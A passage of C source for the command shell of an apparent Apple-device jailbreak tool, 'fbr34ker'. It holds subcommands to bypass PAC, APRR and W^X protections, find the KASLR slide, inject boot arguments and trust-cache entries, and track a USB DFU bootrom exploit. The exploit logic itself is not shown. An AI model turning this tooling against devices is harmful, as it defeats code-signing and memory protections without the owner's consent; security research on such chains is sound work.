        if (jailbreak_detect_kernel(phys, size)) {
            jailbreak_status_t js = jailbreak_get_status();
            fm_printf("Kernel detected: phys=0x%llx entry=0x%llx\n",
                      js.kernel.kernelcache_phys, js.kernel.kernel_entry);
            return 0;
        }
        fm_printf("Kernel detection failed\n");
        return 1;
    }

    if (fm_strcmp(sub, "detect-kaslr") == 0) {
        u64 phys = 0U, size = 0U;
        if (argument_count >= 3) {
            if (!parse_u64(arguments[2], &phys)) { fm_printf("Invalid phys address\n"); return 1; }
            if (argument_count >= 4 && !parse_u64(arguments[3], &size)) { fm_printf("Invalid size\n"); return 1; }
        }
        if (phys == 0U) {
            phys = jailbreak_get_status().kernel.kernelcache_phys;
            size = jailbreak_get_status().kernel.kernelcache_size;
        }
        return jailbreak_detect_kaslr_slide(phys, size)
            ? fm_printf("KASLR slide: 0x%llx\n", jailbreak_get_status().kernel.kaslr_slide), 0 : 1;
    }

    if (fm_strcmp(sub, "inject-bootargs") == 0) {
        const char *args = NULL;
        if (argument_count >= 4 && fm_strcmp(arguments[2], "--args") == 0) {
            args = arguments[3];
        }
        return jailbreak_inject_boot_args(args) ? fm_printf("Boot args injected\n"), 0 : 1;
    }

    if (fm_strcmp(sub, "detect-sep") == 0) {
        u64 base = 0U;
        if (argument_count >= 3 && !parse_u64(arguments[2], &base)) { fm_printf("Invalid SEP base\n"); return 1; }
        return jailbreak_detect_sep(base) ? fm_printf("SEP detected\n"), 0 : 1;
    }

    if (fm_strcmp(sub, "chain-all") == 0) {
        return jailbreak_chain_all() ? fm_printf("Jailbreak chain complete\n"), 0 : 1;
    }

    if (fm_strcmp(sub, "boot-kernel") == 0) {
        u64 entry = 0U;
        if (argument_count >= 3 && !parse_u64(arguments[2], &entry)) { fm_printf("Invalid entry address\n"); return 1; }
        return jailbreak_boot_kernel(entry) ? 0 : 1;
    }

    fm_printf("usage: jailbreak [status|security-model <on|off>|bypass-pac|bypass-aprr|\n"
              "                 bypass-wxn|bypass-all|detect-kernel [--path <phys> [size]]|\n"
              "                 detect-kaslr [phys [size]]|inject-bootargs [--args <str>]|\n"
              "                 detect-sep [base]|chain-all|boot-kernel [entry]]\n");
    return 1;
}

static int command_usb_status(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    usb_device_status_t s = usb_status();
    const usbliter8_status_t es = usbliter8_exploit_status();
    fm_printf("=== USB Status ===\n");
    fm_printf("  MMIO base:    0x%016llx\n", s.mmio_base);
    fm_printf("  Initialized:  %s\n", usb_ready() ? "yes" : "no");
    fm_printf("  Healthy:      %s\n", usb_healthy() ? "yes" : "no");
    fm_printf("  Connected:    %s\n", s.connected ? "yes" : "no");
    fm_printf("  Configured:   %s\n", s.configured ? "yes" : "no");
    fm_printf("  State:        ");
    switch (s.state) {
    case USB_STATE_DETACHED:  fm_printf("detached\n"); break;
    case USB_STATE_ATTACHED:  fm_printf("attached\n"); break;
    case USB_STATE_POWERED:   fm_printf("powered\n"); break;
    case USB_STATE_DEFAULT:   fm_printf("default\n"); break;
    case USB_STATE_ADDRESS:   fm_printf("address\n"); break;
    case USB_STATE_CONFIGURED: fm_printf("configured\n"); break;
    case USB_STATE_SUSPENDED: fm_printf("suspended\n"); break;
    default: fm_printf("unknown\n"); break;
    }
    fm_printf("  Speed:        ");
    switch (s.speed) {
    case USB_SPEED_LOW:   fm_printf("low (1.5 Mbps)\n"); break;
    case USB_SPEED_FULL:  fm_printf("full (12 Mbps)\n"); break;
    case USB_SPEED_HIGH:  fm_printf("high (480 Mbps)\n"); break;
    case USB_SPEED_SUPER: fm_printf("super (5 Gbps)\n"); break;
    case USB_SPEED_UNKNOWN:
    default: fm_printf("unknown\n"); break;
    }
    fm_printf("  Address:      %u\n", s.device_address);
    fm_printf("  Config:       %u\n", s.configuration);
    fm_printf("  RX bytes:     %llu\n", s.bytes_received);
    fm_printf("  TX bytes:     %llu\n", s.bytes_sent);
    fm_printf("  DFU size:     %llu bytes\n", (u64)usb_dfu_image_size());
    fm_printf("  DFU in prog:  %s\n", usb_dfu_in_progress() ? "yes" : "no");
    fm_printf("  Exploit:      ");
    switch (es.state) {
    case USBLITER8_STATE_IDLE:        fm_printf("idle\n"); break;
    case USBLITER8_STATE_PWNDFU:      fm_printf("PWNDFU\n"); break;
    case USBLITER8_STATE_IMAGE_LOADED: fm_printf("image loaded\n"); break;
    case USBLITER8_STATE_EXECUTING:   fm_printf("executing\n"); break;
    case USBLITER8_STATE_COMPLETE:    fm_printf("complete\n"); break;
    case USBLITER8_STATE_FAILED:      fm_printf("FAILED\n"); break;
    default: fm_printf("unknown\n"); break;
    }
    fm_printf("  USB patch:    %s\n", es.usb_patch_applied ? "applied" : "pending");
    return 0;
}

static int command_trust_cache(int argument_count, char **arguments)
{
    if (argument_count < 2) {
        const trust_cache_status_t tcs = trust_cache_get_status();
        fm_printf("=== Trust Cache ===\n");
        fm_printf("  State:        %s\n", tcs.state == TRUST_CACHE_STATE_ACTIVE ? "active" :
                  tcs.state == TRUST_CACHE_STATE_FAILED ? "failed" : "inactive");
        fm_printf("  Slots:        %u / %u\n", (unsigned)tcs.slot_count,
                  (unsigned)TRUST_CACHE_MAX_ENTRIES);
        fm_printf("  Injected:     %u\n", (unsigned)tcs.injected_count);
        fm_printf("  Anchor:       0x%016llx\n", tcs.anchor_address);
        for (u32 i = 0U; i < tcs.slot_count && i < TRUST_CACHE_MAX_ENTRIES; ++i) {
            fm_printf("  [%u] %s: hash_type=%u %s\n",
                      (unsigned)i, tcs.slots[i].name,
                      (unsigned)tcs.slots[i].entry.hash_type,
                      tcs.slots[i].injected ? "injected" : "pending");
        }
        fm_printf("usage: trust-cache [status|find|inject]\n");
        return 0;
    }
    if (fm_strcmp(arguments[1], "status") == 0) {
        const trust_cache_status_t tcs = trust_cache_get_status();
        fm_printf("Trust cache: %u slots, %u injected, anchor=0x%llx\n",
                  (unsigned)tcs.slot_count, (unsigned)tcs.injected_count,
                  tcs.anchor_address);
    } else if (fm_strcmp(arguments[1], "find") == 0) {
        if (trust_cache_find_anchor()) {
            fm_printf("Trust cache anchor found at 0x%llx\n",
                      trust_cache_get_anchor());
        } else {
            fm_printf("Trust cache anchor not found\n");
        }
    } else if (fm_strcmp(arguments[1], "inject") == 0) {
        if (trust_cache_inject_all()) {
            fm_printf("Trust cache entries injected\n");
        } else {
            fm_printf("Trust cache injection failed\n");
        }
    } else {
        fm_printf("usage: trust-cache [status|find|inject]\n");
    }
    return 0;
}

NORETURN void shell_run(void)
{
    char line[SHELL_LINE_CAPACITY];
    fm_printf("Type 'help' for commands.\n");
    for (;;) {
        if (hardware_probe_immutable()) {
            fm_printf("fbr34ker(probe)> ");
        } else {
            fm_printf(bringup_restricted() ? "fbr34ker(bringup)> " : "fbr34ker> ");
        }
        if (read_line(line, sizeof(line)) == 0U) continue;
        (void)shell_execute_line(line);
    }
}
